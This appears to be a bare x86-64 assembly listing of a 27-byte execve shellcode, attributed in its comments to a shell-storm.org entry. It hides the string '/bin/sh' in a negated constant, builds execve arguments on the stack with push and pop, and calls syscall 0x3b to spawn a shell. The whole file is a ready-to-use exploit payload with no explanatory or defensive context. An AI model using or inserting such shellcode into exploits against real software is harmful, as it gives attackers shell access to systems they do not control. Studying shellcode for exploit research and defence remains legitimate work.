; used execve code on shellstrom
; http://shell-storm.org/shellcode/files/shellcode-806.php
; shellcode size - 27 Bytes

    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
